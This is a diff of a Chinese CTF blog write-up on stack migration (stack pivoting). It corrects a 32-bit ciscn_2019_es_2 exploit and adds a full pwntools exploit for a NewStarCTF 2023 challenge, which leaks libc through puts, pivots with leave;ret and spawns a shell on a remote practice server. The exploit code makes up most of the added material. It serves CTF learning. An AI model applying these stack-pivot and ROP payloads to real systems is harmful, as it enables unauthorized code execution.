@@ -1,5 +1,5 @@
 ---
-pythontitle: Stack Migration
+title: Stack Migration
 tags: [ctf-pwn]
 date: 2023-10-11 14:10:00
 categories: [ctf-pwn]
@@ -7,6 +7,10 @@ excerpt: 栈迁移/栈劫持
 ---
 
 ### Stack Migration
+
+#### ciscn_2019_es_2
+
+https://buuoj.cn/challenges#ciscn_2019_es_2
 
 ![](/img/stack_migration/1.jpg)
 
@@ -57,14 +61,91 @@ main=0xdeadbeef
 payload='a'*0x27+'b'
 r.send(payload)
 r.recvuntil("b")
-rbp = u32(r.recv(4))
-print(hex(rbp))
+ebp = u32(r.recv(4))
+print(hex(ebp))
 
-payload2=b'aaaa'+p32(sys)+p32(main)+b"????"+b"/bin/sh"
+payload2=b'aaaa'+p32(sys)+p32(main)+p32(ebp-0x28)+b"/bin/sh"
 payload2=payload2.ljust(0x28,b'\x00')
-payload2+=b"????"+p32(leave_ret)
+payload2+=p32(ebp-0x38)+p32(leave_ret)
 
 r.send(payload2)
 r.interactive()
+```
+
+#### 
+
+
+
+
+
+#### NewStarCTF 2**023** 
+
+stack migration
+
+![](/img/stack_migration/3.jpg)
+
+和前面的唯一区别在于需要先泄露libc地址，题目又给了libc
+
+需要注意的还是不要sendline，因为会多一个\n，占掉了下一次输入，payload2就输入不进去了
+
+```python
+from pwn import *
+#p = process("./pwn")
+p = remote("node4.buuoj.cn",25029)
+
+#gdb.attach(p, "b *0x4012a9")
+e = ELF("./pwn")
+
+#context.log_level="debug"
+
+leave_ret = 0x4012aa
+poprdi_ret = 0x401333
+puts_got = e.got["puts"]
+puts_plt = e.plt["puts"]
+#main = e.sym["main"]
+main = 0x4012ac
+start = 0x4010b0
+
+p.recvuntil(b"your name:\n")
+payload = b"12345678"
+p.send(payload)
+p.recvuntil(b"I have a small gift for you: ")
+buf_addr = eval(p.recv(14))
+print(hex(buf_addr))
+
+
+p.recvuntil(b"more infomation plz:\n")
+payload2 = ( p64(poprdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start)).ljust(80,b'a')
+payload2+= p64(buf_addr) + p64(leave_ret)
+p.send(payload2)
+
+
+p.recvuntil(b"maybe I'll see you soon!\n")
+
+puts_addr = u64(p.recvuntil(b"\x7f").ljust(8,b"\x00"))
+
+print("puts:----" + str(hex(puts_addr)))
+
+
+libc = ELF("libc.so.6")
+libc.address =  puts_addr - libc.sym['puts']
+system = libc.sym["system"]
+binsh = next(libc.search(b"/bin/sh"))
+
+
+p.recvuntil(b"your name:\n")
+payload = b"12345678"
+p.send(payload)
+p.recvuntil(b"I have a small gift for you: ")
+buf_addr = eval(p.recv(14))
+print(hex(buf_addr))
+
+p.recvuntil(b"more infomation plz:\n")
+payload2 = (p64(poprdi_ret) + p64(binsh) + p64(system)).ljust(80,b"a")
+payload2+= p64(buf_addr) + p64(leave_ret)
+p.sendline(payload2)
+
+p.interactive()
+
 ```
 
